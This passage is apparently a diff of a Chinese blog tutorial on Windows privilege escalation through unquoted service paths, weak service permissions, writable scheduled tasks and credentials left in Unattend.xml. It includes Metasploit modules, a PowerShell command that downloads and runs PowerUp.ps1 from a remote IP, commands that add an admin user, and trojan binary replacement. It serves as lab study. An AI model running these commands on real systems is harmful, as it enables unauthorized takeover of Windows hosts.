+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230921220546766.png" alt="image-20230921220546766"></p>
 <p>不过在突然看到靶机中有了相应的exp，我便知道了，upload就会将该 exp由攻击者下载到靶机处，接着执行该 exe 文件，执行后便也就是提权了，即也是为何最后出现system cmd的原因吧，但仍不理解的是为何msf的whoami没有显示管理员权限</p>
 <h2 id="0x03-系统错误配置漏洞提权">0x03 系统错误配置漏洞提权</h2>
 <p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但是如果碰到无法通过系统内核溢出漏洞提权的情况时，会可以利用系统中的错误配置漏洞来提权。下面演示几种常见的Windows系统错误配置漏洞提权方法。</p>
-<h3 id="Trusted-Service-Paths漏洞（可信任服务路径漏洞）">Trusted Service Paths漏洞（可信任服务路径漏洞）</h3>
+<h3 id="trusted-service-paths漏洞可信任服务路径漏洞">Trusted Service Paths漏洞（可信任服务路径漏洞）</h3>
 <p>Trusted Service Paths 漏洞是由系统中的“CreateProcess”函数引起的，并利用了windows文件路径解析的特性。</p>
 <p>首先，我们来认识一下Windows中文件路径解析的特性。例如，我们有一个文件路径为“C:\Program Files\Some Folder\Service.exe”。那么，对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。如上面的目录为例，Windows会依次尝试确定和执行一下程序：</p>
-<pre class="line-numbers language-none"><code class="language-none">1. C:\Program.exe
+<pre><code class="hljs plaintext">1. C:\Program.exe
 2. C:\Program Files\Some.exe
-3. C:\Program Files\Some Folder\Service.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+3. C:\Program Files\Some Folder\Service.exe</code></pre>
 <p>可见，最后才确定并执行真正的程序Service.exe。而由于Windows服务通常是以system权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以system系统权限进行，那么，如果我们将一个“适当命名”的可执行程序上传到以上所说的受影响的目录中，服务一旦启动或重启，该程序就会以system权限运行了，可见该漏洞利用了服务路径的文件/文件夹的权限。</p>
 <p>该漏洞是由于一个服务的可执行文件没有正确的处理所引用的完整路径名，即一个服务的可执行文件的完整路径中含有空格且没有被双引号引起来，那么该服务就存在这个漏洞。下面演示该漏洞利用方法。</p>
 <p>首先，我们可以用以下命令列出目标主机中所有存在空格且没有被引号括起来服务路径：</p>
-<pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr/i /v """<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr/i /v """</code></pre>
 <p>我的靶机都没有此漏洞，也有点懒不想费时间搭了，因此跟着过一遍思路吧</p>
-<p><img src="image-20230923115030829.png" alt="image-20230923115030829"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923115030829.png" alt="image-20230923115030829"></p>
 <p>如上图，可以看到“whoami”和“Bunny”这两个服务对应的二进制文件路径没有引号包含起来，并且路径中包含空格。是存在该漏洞的，但在上传可执行文件进去之前，我们需要确定我们对目标文件夹是否有写入的权限。</p>
 <p>这里我们使用Windows中的icacls命令，依次来检查“C:\”、“C:\Program Files\Program Folder”等目录的权限发现只有“C:\Program Files\program folder”目录有Everyone(OI)(CI)(F)：</p>
 <blockquote>
@@ -640,27 +341,27 @@ Find-AllVulns    // 调用脚本后，执行搜索命令<span aria-hidden="true"
 </ul>
 </blockquote>
 <p>这就意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。</p>
-<p><img src="image-20230923115212928.png" alt="image-20230923115212928"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923115212928.png" alt="image-20230923115212928"></p>
 <p>确认目标机器中存在此漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务。</p>
-<pre class="line-numbers language-none"><code class="language-none">sc stop &lt;service_name&gt;
-sc start &lt;service_name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs plaintext">sc stop &lt;service_name&gt;
+sc start &lt;service_name&gt;</code></pre>
 <p><strong>既然要重启服务，那么我们就可以知道，该提权方法需要管理员权限，重启服务的方法适用于从管理员权限到system的权限提升过程。而实际情况下，我们直接对目标主机执行“shutdown -r -t 0”命令让他重启就行了。</strong></p>
 <p>我们生成一个msf马并重命名为Hello.exe上传到该“C:\Program Files\Program Folder”目录下，然后分别执行如下命令重启该WhoamiTest服务：</p>
-<pre class="line-numbers language-none"><code class="language-none">sc stop WhomaiTest
-sc start WhomaiTest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs plaintext">sc stop WhomaiTest
+sc start WhomaiTest</code></pre>
 <p>如下图完整利用过程：</p>
-<p><img src="image-20230923115348418.png" alt="image-20230923115348418"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923115348418.png" alt="image-20230923115348418"></p>
 <p>可知提权前为管理员权限（liukaifeng01），提权成功后我们得到一个system权限的session。</p>
 <p><strong>这里也是解惑了，是我太傻，原来在上次执行CVE.exe之后，getuid便可以将提权结果展示在meterpreter中</strong></p>
 <p>这里要注意，新反弹得到的meterpreter会很快就中断了，这是因为当一个进程在Windows中启动后，必须与服务控制管理进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以，我们要在终止载荷进程之前将它迁移到其他进程中，使用msf的“set AutoRunScript migrate -f”命令即可实现自动迁移进程：</p>
-<p><img src="image-20230923115657230.png" alt="image-20230923115657230"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923115657230.png" alt="image-20230923115657230"></p>
 <p>该提权方法在metasploit中对应的模块为：<code>exploit/windows/local/unquoted_service_path</code>，使用如下：</p>
 <p>（在之前的metasploit中为exploit/windows/local/trusted_service_path，但在新版的metasploit中替换替换成了exploit/windows/local/unquoted_service_path）</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit/windows/local/unquoted_service_path
+<pre><code class="hljs plaintext">use exploit/windows/local/unquoted_service_path
 set session 1
 set AutoRunScript migrate -f
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230923115758614.png" alt="image-20230923115758614"></p>
+exploit</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923115758614.png" alt="image-20230923115758614"></p>
 <p>如上图，提权成功</p>
 <h3 id="系统服务错误权限配置漏洞">系统服务错误权限配置漏洞</h3>
 <p>Windows 系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。**Windows 服务是以System权限运行的，因此，其文件、文件夹和注册表键值都是受强访问控制机制保护的。**但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p>
@@ -669,7 +370,7 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <li>服务未运行：攻击者会使用任意服务直接替换原来的服务，然后重启服务。</li>
 <li>服务正在运行且无法终止：这种情况符合绝大多数漏洞利用的场景，攻击者通常会利用DLL劫持技术并尝试重启服务来提权。</li>
 </ul>
-<h4 id="1-利用PowerUp-ps1脚本">1. 利用PowerUp.ps1脚本</h4>
+<h4 id="1-利用powerupps1脚本">1. 利用PowerUp.ps1脚本</h4>
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a></p>
 <p>这里我们利用一个Powershell的脚本——PowerUp，该脚本的AllChecks模块会检测目标主机存的Windows服务漏洞，然后通过直接替换可执行文件本身来实现权限的提升。</p>
 <blockquote>
@@ -682,66 +383,66 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 </ul>
 </blockquote>
 <p>将该脚本远程下载或本地导入后，执行Invoke-AllChecks命令进行漏洞检测</p>
-<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Invoke-ALLChecks"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Invoke-ALLChecks"</code></pre>
 <p>这里推荐先下载到本地，不过我这个靶机依旧没有此漏洞，这里就直接用他人的了</p>
-<p><img src="image-20230923151615440.png" alt="image-20230923151615440"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923151615440.png" alt="image-20230923151615440"></p>
 <p>如上图，可以看到PowerUp列出了所有可能存在该漏洞的服务的信息，并在AbuseFunction部分直接给出了利用方式。我们可以看到，目标主机的WhoamiTest服务可能存在该漏洞，然后我们再用icacls命令来测试该服务的可执行文件目录的“C:\Program Files\Program Folder\Hello Whoami\whoami.exe”文件是否有写入权限：</p>
-<pre class="line-numbers language-none"><code class="language-none">icacls "C:\Program Files\Program Folder\Hello Whoami\whoami.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230923151735814.png" alt="image-20230923151735814"></p>
+<pre><code class="hljs plaintext">icacls "C:\Program Files\Program Folder\Hello Whoami\whoami.exe"</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923151735814.png" alt="image-20230923151735814"></p>
 <p>如上图，可以看到我们对whoami.exe文件是有完全控制权的，那么我们就可以<strong>直接将whoami.exe替换成我们的msf马</strong>，当服务重启时，我们就会得到一个System权限的meterpreter。</p>
 <p>这里，我们用“AbuseFunction”那里已经给出的具体操作方式，执行如下。</p>
 <p>将原来的服务可执行文件备份，并用一个可添加管理员用户的恶意可执行文件代替它，默认添加的用户名为join，密码为Password123!：</p>
-<pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Install-ServiceBinary -ServiceName 服务名    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230923151951899.png" alt="image-20230923151951899"></p>
+<pre><code class="hljs plaintext">powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/PowerUp.ps1');Install-ServiceBinary -ServiceName 服务名</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923151951899.png" alt="image-20230923151951899"></p>
 <p>接下来停止并再启动该服务的时候，但由于我们当前是普通用户，我们没有权限重启服务，所以我们可以等目标系统重启，我们通过msf控制目标机执行“shutdown -r”命令来重启，重启后即可成功创建join用户：</p>
-<p><img src="https://image.3001.net/images/20200822/1598030068.png!small" alt="img"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://image.3001.net/images/20200822/1598030068.png!small" alt="img"></p>
 <p>添加指定的管理员用户：</p>
-<pre class="line-numbers language-none"><code class="language-none">Install-ServiceBinary -ServiceName 服务名 -UserName Bunny -Password Liufupeng123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="1598030526.jpeg" alt="img"></p>
-<p><img src="1598030572.jpeg" alt="img"></p>
+<pre><code class="hljs plaintext">Install-ServiceBinary -ServiceName 服务名 -UserName Bunny -Password Liufupeng123</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1598030526.jpeg" alt="img"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1598030572.jpeg" alt="img"></p>
 <p>执行命令：</p>
-<pre class="line-numbers language-none"><code class="language-none">Install-ServiceBinary -ServiceName 服务名 -Command "whoami"   // -Command后加要执行的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="2-Metasploit中的service-permissions模块">2. Metasploit中的service_permissions模块</h4>
+<pre><code class="hljs plaintext">Install-ServiceBinary -ServiceName 服务名 -Command "whoami"   // -Command后加要执行的命令</code></pre>
+<h4 id="2-metasploit中的service_permissions模块">2. Metasploit中的service_permissions模块</h4>
 <p>该漏洞提权在metasploit上面对应的模块为<code>exploit/windows/local/service_permissions：</code></p>
-<p><img src="image-20230923152311550.png" alt="image-20230923152311550"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923152311550.png" alt="image-20230923152311550"></p>
 <p>如上图，该模块有两个可以设置的选项，其中如果把AGGRESSIVE选项设为“true”，则可以利用目标机器上每一个有该漏洞的服务，设为“false”则在第一次提权成功后就会停止工作。演示如下：</p>
-<p><img src="image-20230923152443724.png" alt="image-20230923152443724"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923152443724.png" alt="image-20230923152443724"></p>
 <p>（别忘了迁移进程哦~~）</p>
-<h2 id="0x04-计划任务与AccessChk使用">0x04 计划任务与AccessChk使用</h2>
+<h2 id="0x04-计划任务与accesschk使用">0x04 计划任务与AccessChk使用</h2>
 <p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行我们的恶意程序。下面详细的进行演示。</p>
 <p>首先可以利用如下命令查看计算机的计划任务：</p>
-<pre class="line-numbers language-none"><code class="language-none">schtasks /query /fo list /v
-schtasks /query /fo list /v &gt; schtasks.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="image-20230923152903133.png" alt="image-20230923152903133"></p>
+<pre><code class="hljs plaintext">schtasks /query /fo list /v
+schtasks /query /fo list /v &gt; schtasks.txt</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923152903133.png" alt="image-20230923152903133"></p>
 <p>如上图，我们可以看到，在 C:\Program Files\schtasks\whoami目录有一个test.exe程序，它会在一个时间点自动运行，它会在计算机每次启动时运行，并且是用SYSTEM权限运行的。然后让我们看下我们对这个计划任务的路径是否有写入权限。</p>
 <p>我推荐使用AccessChk工具，其为SysInterals套件里的一个工具，常用于Windows中进行一些系统或程序的高级查询、管理和排除故障等。AccessChk是微软官方的工具，一般不会引起杀软的报警没所以常会被攻击者利用下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p>
 <p>执行以下命令，查看指定目录的权限配置情况：</p>
-<pre class="line-numbers language-none"><code class="language-none">accesschk.exe -dqv "C:\Program Files\schtasks\whoami" -accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230923152958820.png" alt="image-20230923152958820"></p>
+<pre><code class="hljs plaintext">accesschk.exe -dqv "C:\Program Files\schtasks\whoami" -accepteula</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923152958820.png" alt="image-20230923152958820"></p>
 <p>可以清楚地看到，这里有一个很严重的配置错误，对于这个计划任务“test”来说，这里不仅用了system权限来运行，更糟糕的是，任何经过身份验证的用户（Authenticated Users）都对这个文件夹有写入的权限。所以，我们可以生成一个木马，做一个后门就可以了，在本次演示例子中，我们可以简单的用msf木马覆盖掉原来的“test.exe”，如下图我们将原来的test.exe备份后，上传我们自己生成的“test.exe”（msf木马）：</p>
-<p><img src="image-20230923153048834.png" alt="image-20230923153048834"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153048834.png" alt="image-20230923153048834"></p>
 <p>然后重开一个msfconsole，设置好监听，接下来对目标机执行重启命令“shutdown -r -t 0”让其重新启动：</p>
-<p><img src="image-20230923153127662.png" alt="image-20230923153127662"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153127662.png" alt="image-20230923153127662"></p>
 <p>重新启动目标主机后，在另一个msfconsole上面即可得到system权限的session：</p>
-<p><img src="image-20230923153210695.png" alt="image-20230923153210695"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153210695.png" alt="image-20230923153210695"></p>
 <p>成功。</p>
-<h3 id="AccessChk使用">AccessChk使用</h3>
+<h3 id="accesschk使用">AccessChk使用</h3>
 <p>通过上面的例子，我们可以看出accesschk称得上是查找有权限配置缺陷文件夹的必备工具，下面是accesschk的一些其他使用实例。</p>
 <p>当第一次执行任何sysinternals工具包里的工具时，当前用户将会看到一个最终用户许可协议弹框，这是一个大问题，然而我们可以添加一个额外的参数“/accepteula”去自动接受许可协议，即：</p>
-<pre class="line-numbers language-none"><code class="language-none">accesschk.exe /accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">accesschk.exe /accepteula</code></pre>
 <p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p>
 <p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p>
-<pre class="line-numbers language-none"><code class="language-none">accesschk.exe -uwdqs Users c:\ 
-accesschk.exe -uwdqs "Authenticated Users" c:\  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs plaintext">accesschk.exe -uwdqs Users c:\ 
+accesschk.exe -uwdqs "Authenticated Users" c:\</code></pre>
 <p>找出某个驱动器下所有权限配置有缺陷的文件</p>
-<pre class="line-numbers language-none"><code class="language-none">accesschk.exe -uwqs Users c:\*.*  
-accesschk.exe -uwqs "Authenticated Users" c:\*.*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="image-20230923153356455.png" alt="image-20230923153356455"></p>
+<pre><code class="hljs plaintext">accesschk.exe -uwqs Users c:\*.*  
+accesschk.exe -uwqs "Authenticated Users" c:\*.*</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153356455.png" alt="image-20230923153356455"></p>
 <p>如上图可以看到对这个目录下的每一个文件它都列出了Authenticated Users用户组的权限，R为读权限，W为写权限，RW表示有读写权限，如果前面为空则表示没有权限。</p>
 <p>根据前面这几个提权的思路，当我们检查文件或文件夹权限的时候，需要考虑哪些点是易受攻击的点。你需要花费时间来检查所有的启动路径，Windows服务，计划任务和Windows启动项等。</p>
 <h3 id="自动安装配置文件">自动安装配置文件</h3>
 <p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而是会采用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员的账号和密码等信息。我们可以对整个系统进行检查，这些安装配置文文件列举如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">- C:\sysprep.inf
+<pre><code class="hljs plaintext">- C:\sysprep.inf
 - C:\syspreg\sysprep.xml
 - C:\Windows\system32\sysprep.inf
 - C:\windows\system32\sysprep\sysprep.xml
@@ -751,15 +452,15 @@ accesschk.exe -uwqs "Authenticated Users" c:\*.*<span aria-hidden="true" class="
 - C:\Windows\Panther\Unattend\Unattended.xml
 - C:\Windows\Panther\Unattend\Unattend.xml
 - C:\Windows\System32\Sysprep\Unattend.xml
-- C:\Windows\System32\Sysprep\Panther\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+- C:\Windows\System32\Sysprep\Panther\Unattend.xml</code></pre>
 <p>全盘搜索Unattend文件是个好办法，可以用以下命令来全盘搜索Unattend.xml文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">dir /b /s c:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">dir /b /s c:\Unattend.xml</code></pre>
 <ul>
 <li>/S：显示指定目录和所有子目录中的文件。</li>
 </ul>
 <p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会<strong>包含部署操作系统时使用的凭据信息</strong>，这些信息可以帮助我们提权。</p>
 <p>打开文件之后格式为xml格式然后可以进行搜索<code>User</code>、<code>Accounts</code>、<code>UserAccounts</code>、<code>LocalAccounts</code>、<code>Administrator</code>、<code>Password</code>或者经过base64加密的密码，因为我们只需要这部分，例如：</p>
-<pre class="line-numbers language-none"><code class="language-none">......
+<pre><code class="hljs plaintext">......
 
 &lt;UserAccounts&gt;
     &lt;LocalAccounts&gt;
@@ -776,964 +477,474 @@ accesschk.exe -uwqs "Authenticated Users" c:\*.*<span aria-hidden="true" class="
     &lt;/LocalAccounts&gt;
 &lt;/UserAccounts&gt;
 
-......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+......</code></pre>
 <p>在这个Unattend文件中，我们可以看到一个本地账户被创建并加入到了管理员组中。管理员密码没有以明文形式显示，但是显然密码是以Base64进行编码的。</p>
-<pre class="line-numbers language-none"><code class="language-none">echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230923153835677.png" alt="image-20230923153835677"></p>
+<pre><code class="hljs plaintext">echo "UEBzc3dvcmQxMjMhUGFzc3dvcmQ=" | base64 -d</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230923153835677.png" alt="image-20230923153835677"></p>
 <p><strong>解密得密码为"P@ssword123!Password"，但是微软在进行编码前会在Unattend文件中所有的密码后面都追加"Password"，所以我们本地管理员的密码实际上是"P@ssword123!"。</strong></p>
 <p><strong>1. 在Metasploit中利用的相应模块为</strong><code>post/windows/gather/enum_unattend</code></p>
 <p>这个模块仅仅只是搜索Unattend.xml文件，然而会忽略其他像syspref.xml和syspref.inf这样的文件。简而言之，这个模块就是全盘搜索Unattend.xml文件并读取出管理员账户密码。</p>
